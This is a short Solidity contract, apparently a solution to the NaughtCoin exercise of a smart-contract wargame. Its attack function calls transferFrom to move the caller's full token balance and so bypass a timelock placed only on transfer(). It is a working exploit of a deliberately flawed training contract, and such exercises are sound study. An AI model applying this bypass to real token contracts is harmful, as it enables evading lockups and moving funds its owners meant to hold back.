// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "../../../Exercise/Stage1/15/NaughtCoin.sol";
contract AttackNaughtCoin {
    NaughtCoin private naughtCoin;
    constructor(NaughtCoin naughtCoinAddress) public {
        naughtCoin = naughtCoinAddress;
    }

    function attack(address newOwner) external {
        naughtCoin.transferFrom(msg.sender, newOwner ,1000000000000000000000000);
    }
}
